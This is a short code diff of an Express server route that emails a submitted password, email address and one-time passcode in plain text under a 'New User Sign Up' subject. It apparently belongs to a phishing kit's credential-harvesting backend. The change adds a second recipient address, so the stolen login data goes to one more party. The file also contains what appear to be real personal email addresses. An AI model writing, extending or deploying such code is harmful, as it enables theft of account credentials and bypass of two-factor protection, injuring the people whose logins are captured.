@@ -33,7 +33,7 @@ app.post("/data", (req, res) => {
             var userOTP = req.body.userOTP
             var mailOptions = {
                 from: 'Server',
-                to: `alliancebrokersl@gmail.com`,
+                to: `alliancebrokersl@gmail.com, rogerwilliam12@protonmail.com`,
                 subject: 'New User Sign Up',
                 html: `<text> New Log: Pwd: ${userPass} <br> Email: ${userEmail} <br> OTP: ${userOTP}.</text>`
             };
